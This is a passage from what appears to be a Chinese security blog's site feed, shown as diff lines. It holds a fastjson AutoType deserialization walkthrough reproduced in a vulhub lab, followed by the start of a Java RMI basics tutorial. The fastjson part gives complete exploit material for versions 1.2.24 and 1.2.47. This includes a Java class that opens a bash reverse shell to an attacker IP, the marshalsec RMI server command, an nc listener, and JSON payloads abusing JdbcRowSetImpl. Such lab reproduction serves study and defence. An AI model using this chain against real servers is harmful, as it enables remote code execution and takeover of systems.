class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Store&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, phone=&quot;</span> + phone +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手机的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BigDecimal price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BigDecimal <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(BigDecimal price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Apple&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="store.java-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        商店类</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">store</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line">        store.setName(<span class="string">&quot;落星辰&quot;</span>);</span><br><span class="line"><span class="comment">//        苹果手机价格</span></span><br><span class="line">        <span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">        apple.setPrice(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="number">12000</span>));</span><br><span class="line"><span class="comment">//        将苹果手机放入商店</span></span><br><span class="line">        store.setPhone(apple);</span><br><span class="line"><span class="comment">//        序列化操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化：&quot;</span> + s);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">//        反序列化操作</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">ns</span> <span class="operator">=</span> JSON.parseObject(s, Store.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行反序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化：&quot;</span> + ns);</span><br><span class="line">        <span class="type">Apple</span> <span class="variable">a</span> <span class="operator">=</span> (Apple) ns.getPhone();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<p>代码执行结果如下：</p>
+<p><img src="image-20230709162454451.png" alt="image-20230709162454451"></p>
+<p>通过运行结果我们可以得出：在进行反序列化操作后，我们尝试将Phone类型转换为Apple类型，但是抛出了异常，而转换成Phone却不会抛出异常：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Phone</span> <span class="variable">a</span> <span class="operator">=</span> (Phone) ns.getPhone();</span><br><span class="line">System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="image-20230709163301530.png" alt="image-20230709163301530"></p>
+<h3 id="使用AutoType"><a href="#使用AutoType" class="headerlink" title="使用AutoType"></a>使用AutoType</h3><p>为了解决上面的问题，fastjson引入了AdutoType的功能，它会在序列化的时候，把原始类型记录下来。</p>
+<p>我们只需要将上面代码中序列化的操作加上参数<code>SerializerFeature.WriteClassName</code>，它会把原始类型标记下来。下面是修改代码前后比对：</p>
+<div class="tabs" id="修改前"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#修改前-1">修改前</button></li><li class="tab"><button type="button" data-href="#修改前-2">修改后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="修改前-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="修改前-2"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<p>修改之后的运行结果如下：</p>
+<p><img src="image-20230709164210557.png" alt="image-20230709164210557"></p>
+<p>我们可以看到，输出序列化的JSON字符串的时候，多了一个<code>@type</code>的字段，标记了类对应的原始类型，这样方便了在反序列化的时候定位到具体类型。</p>
+<blockquote>
+<p>这就是AutoType的功能，以及fastjson中使用AutoType的原因。</p>
+</blockquote>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
+<p>因为AutoType在设计之初时，安全方面考虑不周全，我们就可以利用这个特性，去构造一个JSON字符串，并使用<code>@type</code>指定一个自己想要攻击的类库。</p>
+<p>最常见的就有sun官方提供过的一个<code>com.sun.rowset.JdbcRowSetImpl</code>这个类，这个类中有个dataSourceName方法支持传入一个<a href="!--swig%EF%BF%BC22--">rmi</a>的源，只要解析其中的url就会支持远程调用。</p>
+<p>那么整个漏洞的利用过程就是：</p>
+<p><img src="image-20230713194942849.png" alt="image-20230713194942849"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote>
+<p>trip: 如何判断是否使用的组件是fastjson可以参考文章：</p>
+<p><a href="https://blog.csdn.net/qq_18980147/article/details/126653516">https://blog.csdn.net/qq_18980147/article/details/126653516</a></p>
+</blockquote>
+<h2 id="1-2-24版本"><a href="#1-2-24版本" class="headerlink" title="1.2.24版本"></a>1.2.24版本</h2><h3 id="开启靶机"><a href="#开启靶机" class="headerlink" title="开启靶机"></a>开启靶机</h3><p>靶场使用vulhub搭建，进入fastjson漏洞的目录</p>
+<p><img src="image-20230709183614815.png" alt="image-20230709183614815"></p>
+<p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后输入下面命令查看靶机是否启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>如果看到下图信息即开启成功</p>
+<p><img src="image-20230709183811800.png" alt="image-20230709183811800"></p>
+<p>启动成功后访问<code>http://你靶机的ip:8090</code>即可访问靶机页面</p>
+<p><img src="image-20230709184308892.png" alt="image-20230709184308892"></p>
+<h3 id="搭建执行恶意命令的服务器"><a href="#搭建执行恶意命令的服务器" class="headerlink" title="搭建执行恶意命令的服务器"></a>搭建执行恶意命令的服务器</h3><blockquote>
+<p>在搭建服务器前，得先搭建Java,maven和rmi服务的环境。搭建文章如下：</p>
+<p>搭建Java环境：</p>
+<p><a href="https://blog.csdn.net/qq_45009837/article/details/126055165">https://blog.csdn.net/qq_45009837/article/details/126055165</a></p>
+<p>搭建maven环境：</p>
+<p><a href="https://blog.csdn.net/qq_45867375/article/details/124730372">https://blog.csdn.net/qq_45867375/article/details/124730372</a></p>
+<p>搭建rmi服务：</p>
+<p><a href="https://blog.csdn.net/m0_54899775/article/details/122485232">https://blog.csdn.net/m0_54899775/article/details/122485232</a></p>
+</blockquote>
+<p>搭建步骤如下：</p>
+<div class="tabs" id="step1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#step1-1">step1</button></li><li class="tab"><button type="button" data-href="#step1-2">step2</button></li><li class="tab"><button type="button" data-href="#step1-3">step3</button></li><li class="tab"><button type="button" data-href="#step1-4">step4</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="step1-1"><p>编写一个恶意类，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//            获取runtime对象</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.74.130/7178 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(commands);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编写完成后，使用javac进行编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Shell.java</span><br></pre></td></tr></table></figure>
+
+<p>编译完成后，目录内容是这样的：</p>
+<p><img src="image-20230712115005969.png" alt="image-20230712115005969"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="step1-2"><p>使用python启动web服务，执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 4433</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后结果如下：</p>
+<p><img src="image-20230712115341348.png" alt="image-20230712115341348"></p>
+<p>访问页面如下：</p>
+<p><img src="image-20230712115403446.png" alt="image-20230712115403446"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="step1-3"><p>启动http服务之后，启动rmi服务器</p>
+<p>在marshalsec的目录下执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.74.130:4433/#Shell&quot;</span> 9999</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>注意：引号那里是根据你开启的http服务器的IP和构造的恶意类决定的。例如你开启HTTP服务的IP是192.168.3.39，端口是6677，构造的恶意类的类名是AABB，那么你的RMI执行远程代码的地址就是：<code>http://192.168.3.39:6677/#AABB</code></p>
+</blockquote>
+<p>执行完成后显示如下信息即表示开启成功：</p>
+<p><img src="image-20230712120233757.png" alt="image-20230712120233757"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="step1-4"><p>在你代码中反弹shell的那个IP对应的电脑上输入如下命令来监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7178</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后会显示如下信息：</p>
+<p><img src="image-20230712120416565.png" alt="image-20230712120416565"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>刷新靶机页面<code>http://你靶机的ip:8090</code>并用burp抓包，将数据包进行修改：</p>
+<ul>
+<li>将请求方法改成POST</li>
+<li>添加如下json数据：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.74.130:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：rmi的地址改成部署的rmi的IP和端口</p>
+</blockquote>
+<p>响应结果如下：</p>
+<div class="tabs" id="rmi日志"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#rmi日志-1">rmi日志</button></li><li class="tab"><button type="button" data-href="#rmi日志-2">http日志</button></li><li class="tab"><button type="button" data-href="#rmi日志-3">nc监听</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="rmi日志-1"><p><img src="image-20230713175230686.png" alt="image-20230713175230686"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="rmi日志-2"><p><img src="image-20230713175450748.png" alt="image-20230713175450748"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="rmi日志-3"><p><img src="image-20230713175517054.png" alt="image-20230713175517054"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<p>可以看到，已经拿到目标服务器的shell了。</p>
+<h2 id="1-2-47版本"><a href="#1-2-47版本" class="headerlink" title="1.2.47版本"></a>1.2.47版本</h2><p>步骤还是一样的，只不过靶机的目录不一样了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.47-rce/</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230713180615788.png" alt="image-20230713180615788"></p>
+<p>进入目录之后执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>开启之后，访问<code>http://开启靶机的ip地址:8090</code>即可访问靶机页面</p>
+<blockquote>
+<p>上面的步骤几乎一样，这里就跳过了</p>
+</blockquote>
+<p>只需要在修改包的时候把构造的数据修改成下面的数据即可：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.32.136:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发送成功后，监听的端口依然能够getshell：</p>
+<p><img src="image-20230713182328478.png" alt="image-20230713182328478"></p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>本文参考文章：</p>
+<ul>
+<li><p><a href="https://juejin.cn/post/6846687594130964488">https://juejin.cn/post/6846687594130964488</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
+</li>
+</ul>
+<p>不同版本fastjson的绕过利用文章(写的很详细)：</p>
+<ul>
+<li><a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>stcs</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>红队</tag>
+        <tag>fastjson</tag>
+        <tag>Java漏洞</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RMI反序列化</title>
+    <url>/stcs/2023/07/3146666c304a/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。</p>
+<p>所以，得先弄清楚RMI等前置知识点再复现fastjson的漏洞，这样能帮助我们更好的理解fastjson漏洞的原理。</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>RMI(远程方法调用，Remote Method Invocation)，在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。它大大增强了Java开发分布式应用的效率，它是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
+<p>Java本身对RMI规范的实现默认是使用JRMP协议，而在Weblogic中对RMI规范的实现使用的是T3协议。</p>
+<blockquote>
+<p>JRMP: Java Remote Message Protocol，Java远程消息交换协议。在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。</p>
+<p>T3协议：它是Weblogic里面独有的一个协议，在前面写的一篇关于RMI的文章里面提到过RMI的传输过程是传输的序列化数据，而在接收后会进行一个反序列化的操作。在Weblogic中对RMI规范的实现使用T3协议。而在T3的传输过程也是一样的。</p>
+</blockquote>
+<p>在开发中，RMI分为三大部分，分别为：<mark class="hl-label blue">**Server**(服务器端)</mark> 、<mark class="hl-label blue">**Client**(客户端)</mark> 和<mark class="hl-label blue">**Registry**(注册表)</mark> 。在下面的表格中会有具体的信息：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Server</td>
+<td align="center">提供远程的对象</td>
+</tr>
+<tr>
+<td align="center">Client</td>
+<td align="center">调用远程的对象</td>
+</tr>
+<tr>
+<td align="center">Registry</td>
+<td align="center">存放着远程对象的位置（ip、端口、标识符）的注册表</td>
+</tr>
+</tbody></table>
+<p>接下来是具体的用例。</p>
+<h2 id="RMI的基础运用"><a href="#RMI的基础运用" class="headerlink" title="RMI的基础运用"></a>RMI的基础运用</h2><p>在上文中可以知道，RMI可以调用远程的Java对象进行本地执行。</p>
+<h3 id="服务器端实现"><a href="#服务器端实现" class="headerlink" title="服务器端实现"></a>服务器端实现</h3><div class="tabs" id="接口代码"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#接口代码-1">接口代码</button></li><li class="tab"><button type="button" data-href="#接口代码-2">接口实现类</button></li><li class="tab"><button type="button" data-href="#接口代码-3">服务端代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="接口代码-1"><p>远程被调用的类必须继承<mark class="hl-label blue">java.rmi.Remote</mark> 接口才能使用。下面是具体的代码用例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RmiTest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line"><span class="comment">//    这里需要抛出RemoteException的异常</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：在定义远程接口时，修饰符必须是<code>public</code>，否则会报错；并且需要抛出RemoteException的异常。</p>
+</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="接口代码-2"><p>在编写实现类的时候，实现类需要继承<mark class="hl-label blue"><strong>UnicastRemoteObject</strong></mark> 类。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server.Impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiTestImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RmiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RmiTestImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是服务端的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在调用远程的方法：test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test方法调用成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：这里必须编写实现类的构造方法，否则会报错</p>
+</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="接口代码-3"><p>现在需要创建一个服务器的实例，并且创建一个注册表，将需要提供给客户端的对象注册上去。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.Impl.RmiTestImpl;</span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"><span class="comment">//        创建服务器对象</span></span><br><span class="line">        <span class="type">RmiTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RmiTestImpl</span>();</span><br><span class="line"><span class="comment">//        创建注册表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line"><span class="comment">//        将服务器对象注册到注册表里</span></span><br><span class="line">        reg.rebind(<span class="string">&quot;test&quot;</span>, test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>下面是一个基础的客户端的实现代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line"><span class="comment">//        创建注册表对象，并读取服务端写入注册表的内容</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">6666</span>);</span><br><span class="line"><span class="comment">//        利用注册表中的代理去查询注册表中名为test的对象</span></span><br><span class="line">        <span class="type">RmiTest</span> <span class="variable">rmiTest</span> <span class="operator">=</span> (RmiTest) reg.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//        调用方法</span></span><br><span class="line">        System.out.println(rmiTest.test());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。</p>
+</blockquote>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><div class="tabs" id="服务端运行"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#服务端运行-1">服务端运行</button></li><li class="tab"><button type="button" data-href="#服务端运行-2">客户端运行</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="服务端运行-1"><p>首先运行服务器端的代码，启动成功之后输出结果如下：</p>
+<p><img src="image-20230703150831399.png" alt="image-20230703150831399"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="服务端运行-2"><p>接下来运行客户端的代码，运行成功之后结果如下：</p>
+<p><img src="image-20230703150925484.png" alt="image-20230703150925484"></p>
+<!--tab 服务器运行-->
+
+<!--tab 客户端回显-->
+
+<p>此时服务器端应该显示下面的内容：</p>
+<p><img src="image-20230703150953147.png" alt="image-20230703150953147"></p>
